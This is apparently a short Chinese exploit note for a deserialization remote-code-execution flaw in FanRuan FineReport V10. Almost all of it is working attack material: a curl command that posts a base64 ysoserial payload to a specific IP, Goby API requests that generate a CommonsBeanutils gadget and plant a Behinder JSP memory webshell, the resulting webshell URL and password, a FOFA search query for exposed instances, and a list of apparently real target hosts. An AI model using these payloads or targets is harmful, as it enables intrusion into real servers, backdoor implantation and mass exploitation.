# 帆软 数据决策系统FineReport V10 webrootdecisionremotedesignchannel反序列化 

    ```
echo "xxxx" | base64 -d | curl -X POST -d @- http://1.58.73.61/webroot/decision/remote/design/channel
```

```
POST /api/v1/ysoserial HTTP/1.1
Host: gobygo.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 152

gadget=CommonsBeanutils1183NOCC¶meters=EX-MS-TFMSFromThread-bx&encoding=base64&url=%2FGqExyxgcDfcc&password=goby&referer=https%3A%2F%2Fgobygo.net%2F
```

WebShell URL: http://1.58.73.61/webroot/mXkgBodBCjKN
Password: goby
Webshell tool: Behinder v3.0
Webshell type: jsp
Referer: https://gobygo.net/

## goby自动化

```
POST /api/v1/debugExp HTTP/1.1
Content-Type: application/json;charset=UTF-8
Authorization: Basic dXNlcjpwYXNz
host: 82.156.29.211:8365
Connection: close
Content-Length: 358

{"hostinfo":"http://1.58.73.61","vulfile":"FineReport_V10_Deserialization_RCE_Vulnerability.go","expparams":{"AttackType":"ysoserial","URL":"/3334","PassWord":"goby","Referer":"https://gobygo.net/","serializedData":"","Gadget":"CommonsBeanutils1183NOCC","Category":"Memory Shell","Memory Shell Category":"TFMSFromThread","Web Shell":"bx","command":"whoami"}}
```

## fofa

```
app="帆软-数据决策系统"
```

| URL  | http://1.58.73.61http://120.78.127.52http://39.107.158.100 |
| ---- | ---------------------------------------------------------- |
